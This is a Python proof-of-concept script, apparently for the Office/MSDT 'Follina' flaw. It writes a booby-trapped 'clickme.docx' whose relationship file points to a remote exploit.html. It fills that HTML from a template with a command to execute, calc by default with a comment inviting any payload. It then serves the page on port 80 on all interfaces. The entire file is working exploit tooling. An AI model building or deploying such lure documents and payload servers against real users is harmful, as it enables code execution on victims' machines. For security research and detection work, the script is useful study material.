#!/usr/bin/env python3
import os
import zipfile
import http.server
import socketserver

payload_url = "http://localhost/exploit.html"
payload = '\\\\\\\\localhost\\\\c$\\\\windows\\\\system32\\\\calc' # Escape extravaganza, insert your payload without .exe (this is always appended)

# Helper function to zip whole dir
# https://stackoverflow.com/questions/1855095/how-to-create-a-zip-archive-of-a-directory
def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            os.utime(os.path.join(root, file), (1653895859, 1653895859))
            ziph.write(os.path.join(root, file), 
                       os.path.relpath(
                            os.path.join(root, file), 
                            path
                       ))

# Prepare the doc file
with open("src/document.xml.rels.tpl", "r") as f:
    tmp = f.read()

payload_rels = tmp.format(payload_url = payload_url)

with open("src/clickme/word/_rels/document.xml.rels", "w") as f:
    f.write(payload_rels)

with zipfile.ZipFile('clickme.docx', 'w', zipfile.ZIP_DEFLATED) as zipf:
    zipdir('src/clickme/', zipf)

print("Generated 'clickme.docx' in current directory")

# Prepare the HTML payload
if not os.path.exists("www"):
    os.makedirs("www")

with open("src/exploit.html.tpl", "r") as f:
    tmp = f.read()

payload_html = tmp.format(payload = payload)

with open("www/exploit.html", "w") as f:
    f.write(payload_html)

# Host it on all interfaces
class Handler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory="www", **kwargs)

print(f"Serving payload on {payload_url}")
with socketserver.TCPServer(("", 80), Handler) as httpd:
    httpd.serve_forever()
